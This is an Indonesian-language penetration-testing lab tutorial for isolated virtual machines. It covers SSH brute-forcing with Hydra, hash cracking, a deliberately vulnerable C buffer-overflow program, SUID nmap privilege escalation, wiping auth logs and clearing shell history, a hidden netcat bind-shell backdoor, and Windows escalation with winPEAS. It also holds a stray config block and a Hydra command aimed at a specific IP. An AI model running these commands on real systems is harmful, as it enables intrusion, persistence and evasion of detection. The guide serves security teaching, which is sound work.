### **Panduan Umum: Persiapan Lingkungan Laboratorium**

Sebelum memulai, sangat penting untuk menekankan bahwa **semua praktek harus dilakukan di lingkungan yang terisolasi dan aman**. Jangan pernah mencoba teknik ini pada sistem yang tidak memiliki izin.

**Persiapan yang Diperlukan:**

1.  **Software Virtualisasi:** [VirtualBox](https://www.virtualbox.org/) (gratis) atau [VMware Workstation Player](https://www.vmware.com/products/workstation-player.html) (gratis untuk penggunaan non-komersial).
2.  **Mesin Serang (Attacker Machine):** **Kali Linux**. Ini adalah distribusi Linux yang sudah dilengkapi dengan ribuan tools untuk penetrasi testing. Unduh sebagai VM image agar lebih mudah.
3.  **Mesin Target (Victim Machine):**
    *   **Metasploitable 2:** Mesin virtual Linux yang sengaja dibuat penuh kerentanan untuk belajar. Ini adalah target yang sempurna untuk latihan.
    *   **Windows 10/11 VM:** Sebuah VM Windows standar (bisa versi trial) untuk praktek khusus Windows.
4.  **Jaringan:** Konfigurasikan jaringan VM ke mode "Internal Network" agar mesin Kali dan Metasploitable/Windows hanya bisa berkomunikasi satu sama lain, terisolasi dari jaringan utama Anda.

---

### **Sesi Praktek 1: Password Cracking**

*   **Tujuan:** Memahami perbedaan antara serangan *online* dan *offline*, serta melihat seberapa cepat password lemah dapat di-crack.
*   **Tools yang Digunakan:** `Hydra` (online), `John the Ripper` (offline), `ssh`.
*   **Langkah-langkah:**
    1.  **Identifikasi Target:** Dari Kali Linux, lakukan scanning terhadap mesin Metasploitable untuk menemukan layanan yang terbuka, misalnya SSH (port 22). Gunakan `nmap -sV <IP_Metasploitable>`.
    2.  **Serangan Online (Hydra):**
        *   Coba lakukan *brute-force* login ke SSH di Metasploitable menggunakan `Hydra` dan daftar password umum (`rockyou.txt` sudah ada di Kali).
        *   **Perintah:** `hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://<IP_Metasploitable>`
        *   **Analisis:** Amati bagaimana Hydra mencoba satu per satu kombinasi user dan password. Diskusikan mengapa serangan ini mudah terdeteksi (log akan penuh dengan percobaan login gagal).
    3.  **Serangan Offline (John the Ripper):**
        *   **Langkah A: Dapatkan Hash Password.** Untuk latihan, kita bisa mendapatkan hash dari Metasploitable (dalam skenario nyata, ini adalah langkah yang sulit). Hash password Linux ada di `/etc/shadow`.
        *   **Langkah B: Gunakan John the Ripper.** Gunakan `john` untuk mencoba memecahkan hash password tersebut dengan daftar kata yang sama.
        *   **Perintah:** `john --wordlist=/usr/share/wordlists/rockyou.txt hash_password.txt`
        *   **Analisis:** Bandingkan kecepatan dan silensi serangan offline dengan online. Penyerang tidak perlu terhubung ke target saat cracking.

```conf
Host 10.180.53.85 
    HostKeyAlgorithms +ssh-rsa,ssh-dss 
    PubkeyAcceptedKeyTypes +ssh-rsa,ssh-dss 
    KexAlgorithms +diffie-hellman-group1-sha1,diffie-hellman-group14-sha1 
    MACs +hmac-md5,hmac-sha1-96,hmac-sha1,umac-64@openssh.com,hmac-ripemd160,hmac-ripemd160@openssh.com,hmac-md5-96
```

run hydra

```sh
sudo hydra -V -l root -t 6 ssh://10.180.53.85 -P /usr/share/wordlists/rockyou.txt
```

### **Sesi Praktek 2: Buffer Overflow**

*   **Tujuan:** Mendemonstrasikan konsep *buffer overflow* dan bagaimana proteksi seperti ASLR/DEP bekerja.
*   **Tools yang Digunakan:** Kode C sederhana, `gcc`, `gdb`.
*   **Langkah-langkah:**
    1.  **Buat Program Rentan:** Di mesin Linux (bisa Metasploitable atau VM Linux lain), buat file C bernama `vuln.c` dengan kode berikut:
        ```c
        #include <stdio.h>
        #include <string.h>
        int main(int argc, char **argv) {
            char buffer[100];
            strcpy(buffer, argv[1]); // Fungsi yang rentan!
            printf("Anda memasukkan: %s\n", buffer);
            return 0;
        }
        ```
    2.  **Kompilasi Tanpa Proteksi:** Kompilasi program ini dengan menonaktifkan beberapa proteksi agar exploit mudah terlihat.
        *   **Perintah:** `gcc -g -fno-stack-protector -z execstack -o vuln vuln.c`
    3.  **Trigger Crash:** Jalankan program dengan input yang sangat panjang untuk menyebabkan *segmentation fault*.
        *   **Perintah:** `./vuln $(python -c 'print "A"*150')`
        *   **Analisis:** Program akan *crash*. Ini membuktikan adanya kerentanan. Penyerang bisa mengganti karakter "A" dengan kode berbahaya (*shellcode*) untuk mengambil alih program.
    4.  **Demonstrasikan Proteksi:** Coba kompilasi ulang program *tanpa* flag `-fno-stack-protector -z execstack`. Jalankan kembali serangannya. Kemungkinan besar program tidak akan bisa dieksploitasi karena proteksi *stack canary* dan *NX bit* aktif.

---

### **Sesi Praktek 3: Eskalasi Privilese di Linux**

*   **Tujuan:** Mempelajari cara menemukan kerentanan eskalasi privilese dan memanfaatkannya untuk mendapatkan akses *root*.
*   **Tools yang Digunakan:** `LinPEAS` (Linux Privilege Escalation Awesome Script), `find`.
*   **Langkah-langkah:**
    1.  **Setup:** Login ke mesin Metasploitable sebagai user dengan privilese rendah (misalnya `user` dengan password `user`).
    2.  **Enumerasi Otomatis:** Download dan jalankan skrip `LinPEAS`. Skrip ini akan memindai seluruh sistem dan menyoroti potensi kerentanan.
        *   **Perintah:** `wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh`
    3.  **Analisis Output:** `LinPEAS` akan menampilkan banyak informasi berwarna. Fokus pada bagian yang berwarna merah/kuning. Salah satu yang paling umum ditemukan di Metasploitable adalah **SUID bit** pada binary `nmap`.
    4.  **Eksploitasi:** Versi lama `nmap` memiliki mode interaktif (`--interactive`) yang memungkinkan eksekusi shell. Karena `nmap` memiliki bit SUID, shell yang dijalankan akan memiliki privilese *root*.
        *   **Perintah:** `nmap --interactive`
        *   Di dalam `nmap`, ketik `!sh` untuk mendapatkan shell root.
        *   Ketik `whoami`, dan hasilnya akan `root`.
    5.  **Analisis:** Diskusikan mengapa memberikan SUID bit pada binary yang powerful seperti `nmap` adalah ide yang buruk. Bagaimana cara memperbaikinya? (Hapus SUID bit dengan `chmod u-s /usr/bin/nmap`).

---

### **Sesi Praktek 4: Manipulasi Log dan Penyembunyian Artefak**

*   **Tujuan:** Memahami cara penyerang menghilangkan jejak dan bagaimana cara mendeteksinya.
*   **Tools yang Digunakan:** Perintah shell dasar (`rm`, `>`, `history`), `vim`.
*   **Langkah-langkah:**
    1.  **Manipulasi Log (Linux):**
        *   Dari shell *root* yang didapat di sesi sebelumnya, lihat log autentikasi: `cat /var/log/auth.log` atau `tail -f /var/log/auth.log`.
        *   Lakukan aktivitas (misalnya `su` ke user lain) dan lihat log terisi.
        *   **Hapus Log:** Kosongkan file log dengan perintah `> /var/log/auth.log`.
        *   **Analisis:** Coba lihat log lagi. Isinya sudah hilang. Diskusikan mengapa ini menjadi peringatan besar dan bagaimana *centralized logging* (SIEM) dapat mencegah ini.
    2.  **Menyembunyikan Artefak (Linux):**
        *   Buat file *backdoor* sederhana: `echo "nc -l -p 5555 -e /bin/bash &" > /tmp/.update.sh`. Beri nama yang mencurigakan seperti `.update.sh` (dimulai dengan titik untuk disembunyikan).
        *   Jalankan file tersebut: `chmod +x /tmp/.update.sh && /tmp/.update.sh`.
        *   **Hapus Riwayat Perintah:** Ketik `history -c` untuk menghapus riwayat perintah shell.
        *   **Analisis:** Bagaimana cara seorang analis menemukan file tersembunyi ini? (Gunakan `ls -la /tmp`). Bagaimana cara menemukan proses yang berjalan? (Gunakan `ps aux | grep nc`). Ini menunjukkan bahwa menghapus jejak tidak pernah sempurna.

---

### **Sesi Praktek 5: Eskalasi Privilese di Windows**

*   **Tujuan:** Melihat contoh eskalasi privilese yang umum di Windows.
*   **Tools yang Digunakan:** `winPEAS`, `PowerShell`.
*   **Langkah-langkah:**
    1.  **Setup:** Login ke VM Windows sebagai user standar (bukan administrator).
    2.  **Enumerasi:** Download dan jalankan `winPEAS` (versi Windows). Mirip `LinPEAS`, skrip ini akan memindai konfigurasi yang tidak aman.
    3.  **Analisis Output:** `winPEAS` mungkin akan menemukan:
        *   Password yang tersimpan di dalam file konfigurasi.
        *   Layanan yang berjalan dengan privilese tinggi yang bisa dimodifikasi oleh user biasa.
        *   Aplikasi yang selalu di-*update* yang bisa dieksploitasi.
    4.  **Eksploitasi (Contoh):** Jika ditemukan password untuk user administrator di dalam file, gunakan password tersebut untuk login sebagai admin atau menjalankan perintah dengan `runas`.
        *   **Perintah:** `runas /user:Administrator cmd.exe`
    5.  **Analisis:** Diskusikan pentingnya **Principle of Least Privilege** dan tidak menyimpan kredensial dalam *plaintext*.

